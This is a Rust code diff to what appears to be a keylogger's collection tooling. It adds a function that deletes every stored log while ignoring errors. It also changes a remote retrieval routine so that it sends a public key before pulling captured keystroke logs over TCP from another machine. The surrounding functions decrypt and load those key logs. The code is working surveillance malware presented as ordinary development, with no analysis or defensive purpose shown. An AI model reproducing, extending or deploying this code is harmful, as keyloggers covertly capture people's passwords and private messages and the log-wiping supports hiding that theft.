@@ -312,6 +312,17 @@ pub fn decrypt_sym(log_file_path: &str, key_file_path: &str) -> Result<(), Box<s
     Ok(())
 }
 
+// Delete all logs, ignore any problems.
+pub fn delete_all_logs(logs_folder: &str) -> Result<(), Box<std::error::Error>> {
+    for path in std::fs::read_dir(logs_folder)? {
+        let path = path.unwrap().path();
+        if std::fs::rename(path.to_str().unwrap(), path.to_str().unwrap().to_owned() + ".delete").is_ok() {
+            std::fs::remove_file(path.to_str().unwrap().to_owned() + ".delete").is_ok();
+        }
+    }
+    Ok(())
+}
+
 pub fn load_all_key_logs(log_folder_path: &str) -> Result<Vec<(String, Vec<u8>)>, Box<std::error::Error>> {
     let paths = std::fs::read_dir(log_folder_path)?;
     Ok(paths.filter_map(|name| {
@@ -331,12 +342,19 @@ pub fn load_key_logs(log_file_path: &str) -> Result<Vec<u8>, Box<std::error::Err
     Ok(contents)
 }
 
-pub fn retrieve_remote_keylogs(addr: &str) -> Vec<(String, Vec<u8>)> {
+pub fn retrieve_remote_keylogs(addr: &str, public_key: &[u8]) -> Vec<(String, Vec<u8>)> {
     println!("{}", addr);
     let mut stream = std::net::TcpStream::connect(addr).expect("Error connecting");
+
+    stream.write(public_key);
+
     let mut data = Vec::new();
 
     stream.read_to_end(&mut data).unwrap();
+    if &data == b"Wrong Key" {
+        panic!("Public key incorrect");
+    }
+
     let (header, content) = data.split_at(data.iter().position(|item| item == &('\n' as u8)).expect("Header error"));
     let header: Vec<usize> = std::str::from_utf8(header).expect("Header error").split(";").map(|s: &str| s.parse::<usize>().expect("Header error")).collect::<Vec<usize>>();
 
